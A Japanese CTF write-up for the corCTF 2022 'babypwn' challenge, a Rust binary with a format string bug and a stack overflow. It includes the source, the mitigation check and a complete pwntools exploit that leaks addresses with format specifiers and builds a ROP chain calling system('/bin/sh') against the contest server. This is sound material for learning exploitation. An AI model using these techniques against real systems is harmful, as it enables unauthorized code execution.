# corCTF 2022 `babypwn [pwn]` writeup

## 問題
Just another one of those typical intro babypwn challs... wait, why is this in Rust?

`nc be.ax 31801`

実行ファイルとソースコード、Dockerfile、libcが配られる。

```rs
use libc;
use libc_stdhandle;

fn main() {
    unsafe {
        libc::setvbuf(libc_stdhandle::stdout(), &mut 0, libc::_IONBF, 0);

        libc::printf("Hello, world!\n\0".as_ptr() as *const libc::c_char);
        libc::printf("What is your name?\n\0".as_ptr() as *const libc::c_char);

        let text = [0 as libc::c_char; 64].as_mut_ptr();
        libc::fgets(text, 64, libc_stdhandle::stdin());
        libc::printf("Hi, \0".as_ptr() as *const libc::c_char);
        libc::printf(text);

        libc::printf("What's your favorite :msfrog: emote?\n\0".as_ptr() as *const libc::c_char);
        libc::fgets(text, 128, libc_stdhandle::stdin());
        
        libc::printf(format!("{}\n\0", r#"
          .......           ...----.
        .-+++++++&&&+++--.--++++&&&&&&++.
       +++++++++++++&&&&&&&&&&&&&&++-+++&+
      +---+&&&&&&&@&+&&&&&&&&&&&++-+&&&+&+-
     -+-+&&+-..--.-&++&&&&&&&&&++-+&&-. ....
    -+--+&+       .&&+&&&&&&&&&+--+&+... ..
   -++-.+&&&+----+&&-+&&&&&&&&&+--+&&&&&&+.
 .+++++---+&&&&&&&+-+&&&&&&&&&&&+---++++--
.++++++++---------+&&&&&&&&&&&&@&&++--+++&+
-+++&&&&&&&++++&&&&&&&&+++&&&+-+&&&&&&&&&&+-
.++&&++&&&&&&&&&&&&&&&&&++&&&&++&&&&&&&&+++-
 -++&+&+++++&&&&&&&&&&&&&&&&&&&&&&&&+++++&&
  -+&&&@&&&++++++++++&&&&&&&&&&&++++++&@@&
   -+&&&@@@@@&&&+++++++++++++++++&&&@@@@+
    .+&&&@@@@@@@@@@@&&&&&&&@@@@@@@@@@@&-
      .+&&@@@@@@@@@@@@@@@@@@@@@@@@@@@+
        .+&&&@@@@@@@@@@@@@@@@@@@@@&+.
          .-&&&&@@@@@@@@@@@@@@@&&-
             .-+&&&&&&&&&&&&&+-.
                 ..--++++--."#).as_ptr() as *const libc::c_char);
    }
}
```

## 解法
Rustで書かれてるけどなんとなく読める。
そしてあからさまなFormat String BugsとStack Buffer Overflowがある。

セキュリティ機構のチェック。

```
[*] '/home/caffeine/ctf/corctf22/pwn/babypwn/babypwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
```
PIE enableなのでlibcとelfのアドレスリークしたい。
FSA (Read) でスタックの中にあるlibcとelfのアドレスをリークしてオフセットからベースのアドレスを計算しよう。
絶対アドレスが分かったらBOFでROPを組んで`system("/bin/sh")`を作る。

方針が決まったので、動的解析してlibcとelf領域のアドレスがスタックに眠ってないか確認する。
動的解析の過程でmain関数がめっちゃ短いことに気が付いた。
ソースコードをよく見るとmain関数全体が`unsafe{}`で囲まれている。
これの影響でソースコードの内容はmain関数から何度も関数を潜った先に実行されるようだ (gdbのbacktraceで見てみると10個以上関数を潜っている)。

ここまで来たらこっちのものだ。
スタックを掘ってmain関数の先頭アドレスや__libc_start_mian+243を発見。
こいつらをリークして自由自在にROPを組んでやりましょう。

## Exploit
解法に書いた通りにPwntools使って書くだけ。
強いて言えばスタックのアライメントには気を付けましょう (1敗)。

以上を踏まえて作成したexploit codeは以下の通り。

```py
from pwn import *
import sys
​
chall = "./babypwn"
# io = process(chall)
io = remote("be.ax", 31801)
​
elf = ELF(chall)
libc = ELF("libc.so.6")
​
main =  "_ZN7babypwn4main17h8f55ddfb4d984bd7E"
​
# 第86引数にmainの頭
# 第87引数に__libc_start_mian+243
payload = b"%86$p %87$p"
io.sendlineafter(b"name?", payload)
​
io.recvuntil(b"Hi, ")
ret = io.recvline()
print("main addr: " + ret[0:14].decode())
print("__libc_start_main addr: " + ret[15:-1].decode() + " - 0xf3")
​
elf.address = int(ret[2:14].decode(),16) - elf.sym[main]
addr_libc_start_main = int(ret[17:-1].decode(),16) - 0xf3
libc.address = addr_libc_start_main - libc.sym["__libc_start_main"]
​
# ROPgadgetの準備
addr_ret = elf.address + 0x501a
addr_pop_rdi_ret = elf.address + 0x51d1
​
# mainのreturn addressは97バイト目から書き換えられる
payload = b"A" * 0x60
payload += p64(addr_ret)
payload += p64(addr_pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym["system"])
​
io.sendlineafter(b"emote?\n", payload)
io.interactive()
```

FLAG: `corctf{why_w4s_th4t_1n_rust???}`